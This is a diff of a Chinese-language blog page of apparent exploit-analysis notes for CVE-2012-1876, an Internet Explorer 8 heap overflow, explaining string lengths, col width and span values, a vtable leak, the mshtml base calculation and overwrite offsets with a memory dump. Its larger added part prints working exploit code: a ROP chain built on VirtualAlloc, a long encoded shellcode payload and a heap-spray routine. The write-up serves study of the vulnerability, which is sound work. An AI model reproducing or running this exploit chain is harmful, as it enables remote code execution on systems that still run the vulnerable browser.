@@ -69,13 +69,13 @@
 调试环境: XP SP3中文版 + Internet Explorer 8.0.6001.18702</p>
 <h1>要点记要</h1>
 <p>常规分析内容就不写了，网上有很多分析文章，这里主要记录分析要点</p>
-<h3>1.  申请字符串-6</h3>
+<h3>1.  申请字符串长度为什么-6？</h3>
 <pre class="lang-html"><code>            // E
             rra[i] = dap.substring(0, (0x100-6)/2);
 </code></pre>
 <p><img alt="string" src="data/cve-2012-1876/str.png">
 可以看到字符串长度和结束字符共占6个字节</p>
-<h3>2. 为什么要appendChild</h3>
+<h3>2. 为什么要appendChild?</h3>
 <pre class="lang-html"><code>            // B
             var obj = document.createElement("button");
             div_container.appendChild(obj);
@@ -96,6 +96,159 @@ alloc heap: 100 addr: 325d880
 </code></pre>
 <p>这里引用<a href="https://kbandla.github.io/posts/2014/Jun/20/Internet%20Explorer%20Isolated%20Heap.html">《Internet Explorer Isolated Heap》</a>，可以看到
 CButton 58h，上面我的日志也看到申请58大小空间是无法和3次申请100大小空间连续起来，在申请58到后续申请100大小间还有7次alloc,其中当大小是fc时，跟申请100大小空间的地址是连续的，而申请fc大小正是由于appendChild所影响的</p>
+<h3 class="lang-html">3. 133个col元素中width、span为什么是这个值?</h3>
+<pre><code>&lt;col id="0" width="41" span="9" &gt;  &lt;/col&gt;
+</code></pre>
+<p>因为需要分配vulBuffer到之前释放的E的位置，所以9 * 0x1c = 0xfc</p>
+<h3 class="lang-javascript">4. leak变量计算vtable中是如何计算的？</h3>
+<pre><code>var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2);
+</code></pre>
+<p>其中6之前解释了，2就是结束字符，8就是堆指针，具体如下图
+<img alt="leak" src="data/cve-2012-1876/leak.png"></p>
+<p class="lang-javascript">我觉得这样写更好理解</p>
+<pre><code>var leak = arr[i].substring((0x100-4)/2+(8)/2, (0x100-4)/2+(8+4)/2);
+</code></pre>
+<h3 class="lang-javascript">5. mshtml基址怎么计算的？</h3>
+<pre><code>mshtmlbase = leak_addr - Number(0x001582b8);
+</code></pre>
+<p>因为button元素vtable相距mshtml基址偏移是固定的，其中在我的调试中值就是上面的，跟原exp不同</p>
+<h3 class="lang-javascript">6. 第二次堆溢出值的计算？</h3>
+<pre><code>            obj_col_0.width = "1178993";                    // smash the vftable 0x07070024
+            obj_col_0.span = "44";                      // the amount to overwrite
+</code></pre>
+<p class="lang-c">其中1178993对应堆喷的地址，44对应vulBuffer到CButton::vtable的偏移，见下数据</p>
+<pre><code>0325d670  fa 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00  ....E.E.E.E.E.E.
+0325d680  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d690  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d6a0  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d6b0  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d6c0  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d6d0  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d6e0  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d6f0  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d700  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d710  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d720  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d730  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d740  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d750  45 00 45 00 45 00 45 00-45 00 45 00 45 00 45 00  E.E.E.E.E.E.E.E.
+0325d760  45 00 45 00 45 00 45 00-45 00 45 00 45 00 00 00  E.E.E.E.E.E.E...
+0325d770  16 c8 ff e9 00 01 08 ff-fa 00 00 00 41 00 41 00  ............A.A.
+0325d780  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d790  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d7a0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d7b0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d7c0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d7d0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d7e0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d7f0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d800  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d810  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d820  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d830  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d840  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d850  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d860  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0325d870  41 00 41 00 41 00 00 00-f7 c9 ff e9 00 01 08 ff  A.A.A...........
+0325d880  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.
+0325d890  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d8a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d8b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d8c0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d8d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d8e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d8f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d900  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d910  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d920  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d930  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d940  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d950  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d960  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.
+0325d970  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...
+0325d980  c8 c9 ff e9 00 01 0c ff-08 ae 77 63 20 80 23 00  ..........wc .#.
+</code></pre>
+<p class="lang-c">可以看到</p>
+<pre><code>vulBuffer = 0x0325d670
+CButton::vtable = 0x0325d988
+0325d988 - 0325d670 = 0x318
+[0x318 / 0x1c]向上取整 = 29
+</code></pre>
+<p>所以这里其实span是29就足够覆盖到，不知道EXP为什么是44（知道请告诉我~）</p>
+<h3>7. 如何堆喷到精确地址0x7070024？</h3>
+<p>引用这篇文章
+<a class="lang-javascript" href="http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html">《Targeted Heap Spraying》</a>结合代码讲解</p>
+<pre><code>        var heapobj = new Object();
+
+        // generated with mona.py (mshtml.dll v)
+            function rop_chain(mshtmlbase){
+                var arr = [
+                mshtmlbase + Number(0x00001031),
+                mshtmlbase + Number(0x00002c78),    // pop ebp; retn
+                mshtmlbase + Number(0x0001b4e3),    // xchg eax,esp; retn (pivot)
+                mshtmlbase + Number(0x00352c8b),    // pop eax; retn
+                mshtmlbase + Number(0x00001340),    // ptr to &amp;VirtualAlloc() [IAT]
+                mshtmlbase + Number(0x00124ade),    // mov eax,[eax]; retn
+                mshtmlbase + Number(0x000af93e),    // xchg eax,esi; and al,0; xor eax,eax; retn
+                mshtmlbase + Number(0x00455a9c),    // pop ebp; retn
+                mshtmlbase + Number(0x00128b8d),    // &amp; jmp esp
+                mshtmlbase + Number(0x00061436),    // pop ebx; retn
+                0x00000001,                 // 0x00000001-&gt; ebx
+                mshtmlbase + Number(0x0052d8a3),    // pop edx; retn
+                0x00001000,                 // 0x00001000-&gt; edx
+                mshtmlbase + Number(0x00003670),    // pop ecx; retn
+                0x00000040,                 // 0x00000040-&gt; ecx
+                mshtmlbase + Number(0x001d263d),    // pop edi; retn
+                mshtmlbase + Number(0x000032ac),    // retn
+                mshtmlbase + Number(0x00352c9f),    // pop eax; retn
+                0x90909090,                 // nop
+                mshtmlbase + Number(0x0052e805),    // pushad; retn
+                0x90909090,
+                0x90909090,
+                0x90909090,
+                0x90909090,
+                0x90909090,
+                    ];
+                return arr;
+         }
+
+        function d2u(dword){
+            var uni = String.fromCharCode(dword &amp; 0xFFFF);
+            uni += String.fromCharCode(dword&gt;&gt;16);
+            return uni;
+        }
+
+        function tab2uni(heapobj, tab){
+            var uni = ""
+            for(var i=0;i&lt;tab.length;i++){
+                uni += heapobj.d2u(tab[i]);
+            }
+            return uni;
+        }
+
+        heapobj.tab2uni = tab2uni;
+        heapobj.d2u = d2u;
+        heapobj.rop_chain = rop_chain;
+
+        var code = unescape("%u40b0%u414b%u1d24%ub4a8%u7799%ube37%ua947%ud41a%u353f%ueb30%ud133%u2ae1%u31e0%ue2d3%u1514%ufd13%u3497%u7a7b%ufc39%u92ba%u9390%u0a4e%ubbf5%u8db2%ue385%uf823%ud53a%u0448%u750d%ud632%u707c%u4642%u7e78%ub12c%u2f98%u1c3c%u727e%u3b7b%u4fe0%ue38c%u4f76%u81b0%u2de2%u35ba%u86bb%u67f8%u8d0c%u9190%u7574%u7f71%u7d3c%u9f15%ub347%ud50b%u784e%u4970%u1b37%uc1ff%uc6fe%uc0c7%ub6d4%u9246%ub4b1%uf588%ua91d%u7c4b%u2548%u7a99%u9b3d%u01b7%u34eb%u1cb5%u38a8%ub8fc%ud609%ube4a%u9714%ue121%ub904%u42b2%u7796%u6924%u80f9%u0dfd%u412c%u2f05%u273f%ubf40%u9893%u7343%u6679%u77a8%ub63f%u7472%u707b%u843d%uebd2%uf630%ubfd5%u71b2%u757a%u1848%u0cf5%u96b7%uf889%u764a%u9b2d%u92b0%u66be%u7d97%ub425%u9114%u4904%uba34%u421c%ue308%uf902%u4140%u4773%u0d27%u93b5%u2299%u1dd4%u7c4f%u2867%u98fc%u2c24%ue212%ufd03%u78a9%u3505%u8390%u2fe0%u4337%u154b%u468d%u79b9%u297f%ubbd6%u197e%u4ee1%u9fb8%ub1b3%u4a3c%u7a7d%u7679%u4670%u2091%u74e1%ub043%u4e71%ub590%u75b7%u983c%u4bb3%ud687%uf86b%u9b40%u117f%ud1f7%u7bf9%u152f%u3427%u1d92%u3d97%u2d49%u720d%u014f%u7ce0%u3105%u10eb%u35f5%ub4b6%u1c2c%u93b2%u4704%ud52b%ubbb1%ue389%u4137%u7e78%u733f%u7742%u2925%ufcd0%u6624%u8dba%u67b9%u1a96%ua8fd%ua9be%ud40b%u4899%u9f14%u87bf%ue2f7%ub80c%u903d%u14b0%u25bb%u7d96%u1a7f%u79f5%uf809%u347c%u7b91%u4e47%ueb81%ue122%ud41b%u7074%ub21d%u2d72%u928d%ub3b1%ua905%u71b4%u4b0c%u9343%u0d76%u989f%u84b5%ub7d5%u4666%ube40%ub8bf%u201c%u48e2%u4a73%u6b2c%u2afc%u04e0%u4941%u3777%u10ba%u7ed6%u332f%ub9fd%u7a9b%u7875%u2415%u1299%uf9d2%u3f97%ub63c%u3567%u27a8%ue386%u7742%u4f73%ue380%ua93c%u757c%uf62b%ud0c0%u27e0%u214b%ue1d3%ub93f%u157d%u8c14%ue2c1%u9904%u7498%u7071%u6637%ueb28%u4e1c%u7fb6%u357b%u3297%u25d4%uf569%u9105%u4047%u0224%u78d6%u7941%uba3d%u49b1%u7276%u1d2f%u85bf%u67fc%u7e92%u4a2c%u7ab4%u1348%u93d5%u8d9b%u03bb%u74fd%u0879%u43e1%ue083%u1873%u46e3%u2372%ub2f8%u88b0%ub8f9%u969f%u75b5%u770c%u7b42%ub72d%u7aa8%ue219%ueb38%ub334%u90be%u4f7e%u0d7f%ub3b6%u3076%ubff5%u479f%u7167%ud40a%u3b7c%u66fc%u41b7%u9615%u3dfd%u3505%ub825%u1c7d%ub54a%u3940%u37d6%u3f92%u971d%u1478%u8d49%ua8b2%u3493%u2c3c%u902f%ud54f%u04a9%u1198%u91f8%ub99b%u9943%ubbb1%u0d70%u4824%u4b0c%ube4e%ub02d%uf93a%u27ba%ub446%udb42%ud9d1%u2474%u5af4%uc929%u49b1%u8cbe%uc04a%u31a0%u1972%uc283%u0304%u1572%ubf6e%u483c%u40e7%u89bd%uc997%ub858%uae85%ue929%ua419%u027c%ue8d2%u9194%u2496%u129a%u131c%ua395%u9b91%u6779%u67b0%ub480%u5912%uc94b%u9e53%u22b6%u7701%u91bc%ufcb5%u2980%ud2b4%u128e%u57ce%ue650%u5964%u5781%u11f3%ud339%u825b%u3038%ufeb8%u3d73%u740a%u9782%u7543%ud7b4%u480f%uda78%u8c4e%u05bf%ue625%ub8c3%u3d3d%u66b9%ua0c8%uec19%u016a%u219b%uc2ec%u8e97%u8c7b%u11bb%ua6a8%u9ac0%u694f%ud841%uad6b%uba09%uf412%u6df7%ue62b%ud150%u6c89%u0672%u2eab%ueb1b%ud081%u63db%ua392%u2ce9%u2c08%ua442%uab96%u9fa5%u236e%u2058%u6d8e%u749f%u05de%uf536%ud5b5%u20b7%u8619%u9b17%u76d9%u4bd8%u9cb1%ub4d7%u9ea1%udd3d%u644b%u22d6%u6723%ucb43%u6831%u579a%u8ebc%u77f6%u19e8%ue16f%ud2b1%uee0e%u9f6c%u6411%u5f82%u8ddf%u73ef%u7d88%u2eba%u811f%u4411%u17a0%ucf9d%u8ff7%u369f%u103f%u1d60%u994b%udef4%ue624%udf18%ub0b4%udf72%u64dc%u8c26%u6af9%ua0f3%uff51%u90fb%ua806%u1e93%u9e70%ue03c%u1e57%u3701%ua49e%u3d73%u64f2");
+        var rop_chain = heapobj.tab2uni(heapobj, heapobj.rop_chain(mshtmlbase)) ;
+        var shellcode = rop_chain + code
+
+        while (shellcode.length &lt; 100000)
+            shellcode = shellcode + shellcode;
+
+        var onemeg = shellcode.substr(0, 64*1024/2);
+        for (i=0; i&lt;14; i++) {
+            onemeg += shellcode.substr(0, 64*1024/2);
+        }
+
+        onemeg += shellcode.substr(0, (64*1024/2)-(38/2));
+        var spray = new Array();
+
+        for (i=0; i&lt;400; i++) {
+            spray[i] = onemeg.substr(0, onemeg.length);
+        }
+</code></pre>
 			</div>
 		</div>
 	</div>
